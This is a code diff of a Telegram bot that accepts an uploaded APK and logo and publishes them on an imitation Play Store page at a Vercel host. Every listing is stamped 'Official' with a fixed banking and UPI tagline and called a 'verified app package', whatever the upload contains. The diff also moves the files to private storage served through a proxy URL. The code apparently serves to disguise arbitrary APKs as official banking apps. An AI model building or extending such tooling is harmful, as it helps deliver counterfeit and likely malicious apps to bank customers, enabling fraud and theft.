@@ -29,7 +29,7 @@ async function saveTelegramFile(fileId, path) {
 	const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
 	if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);
 
-	const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
+	const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
 	if (blobToken) options.token = blobToken;
 	const blob = await put(path, await download.arrayBuffer(), options);
 	return blob.url;
@@ -37,7 +37,7 @@ async function saveTelegramFile(fileId, path) {
 
 async function loadSession(chatId) {
 	try {
-		const options = {};
+		const options = { access: 'private' };
 		if (blobToken) options.token = blobToken;
 		const record = await head(`sessions/${chatId}.json`, options);
 		if (record?.url) {
@@ -55,7 +55,7 @@ async function loadSession(chatId) {
 
 async function saveSession(chatId, session) {
 	try {
-		const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
+		const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
 		if (blobToken) options.token = blobToken;
 		await put(`sessions/${chatId}.json`, JSON.stringify(session), options);
 	} catch (err) {
@@ -134,6 +134,7 @@ export default async function handler(request, response) {
 				: message.document.file_id;
 
 			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo image...' });
+			session.data.logoFileId = fileId;
 			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
 			session.step = 'apk';
 			if (!session.data.name) {
@@ -151,21 +152,31 @@ export default async function handler(request, response) {
 		// 2. If user sent an APK Document (Step 3)
 		if (isApkDoc) {
 			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading APK & generating Play Store page...' });
-			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${chatId}/base.apk`);
+			const slug = slugify(session.data.name || 'app');
+			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${slug}/base.apk`);
+			if (session.data.logoFileId) {
+				await saveTelegramFile(session.data.logoFileId, `apps/${slug}/logo`);
+			}
+
+			const host = request.headers.host || 'playstore-web-143.vercel.app';
+			const logoUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/logo`)}`;
+			const apkUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/base.apk`)}`;
+
+			session.data.slug = slug;
+			session.data.logoUrl = logoUrl;
+			session.data.apkUrl = apkUrl;
 			session.data.name = session.data.name || 'App';
 			session.data.developer = session.data.developer || `${session.data.name} Official`;
-			session.data.slug = slugify(session.data.name);
 			session.data.category = 'APPS';
 			session.data.tagline = 'Secure Mobile Banking, Instant UPI Transfers & Financial Services';
 			session.data.description = `Official ${session.data.name} app by ${session.data.developer}. Download the verified app package.`;
 			session.data.version = '1.0.0';
 
-			const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
+			const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
 			if (blobToken) options.token = blobToken;
-			await put(`apps/${session.data.slug}.json`, JSON.stringify(session.data), options);
+			await put(`apps/${slug}.json`, JSON.stringify(session.data), options);
 
-			const host = request.headers.host || 'playstore-web-143.vercel.app';
-			const liveUrl = `https://${host}/app/${session.data.slug}`;
+			const liveUrl = `https://${host}/app/${slug}`;
 
 			const replyMarkup = {
 				inline_keyboard: [
